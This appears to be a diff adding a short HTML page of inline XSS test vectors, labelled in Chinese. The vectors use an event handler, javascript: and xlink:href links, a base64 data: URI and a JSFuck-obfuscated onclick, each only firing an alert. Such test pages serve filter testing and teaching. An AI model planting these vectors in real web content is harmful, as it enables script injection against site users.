@@ -1,0 +1,6 @@
+<h1>内联型 - XSS测试</h1>
+Test-1： <img src="anobymous.jpg" width="100px" onmouseout="alert('hacked by bb!')"><br/>
+Test-2： <a href="javascript:alert('hacked by bb!')">点我</a><br/>
+Test-3： <a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgzKTwvc2NyaXB0Pg==">点我</a><br/>
+Test-4： <a xlink:href="javascript:alert('hacked by bb!')">点我</a><br/>
+Test-5： <a onclick="alert((+[][+[]]+[])[++[[]][+[]]]+([![]]+[])[++[++[[]][+[]]][+[]]]+([!![]]+[])[++[++[++[[]][+[]]][+[]]][+[]]]+([!![]]+[])[++[[]][+[]]]+([!![]]+[])[+[]])" href="javascript:void">点我</a>
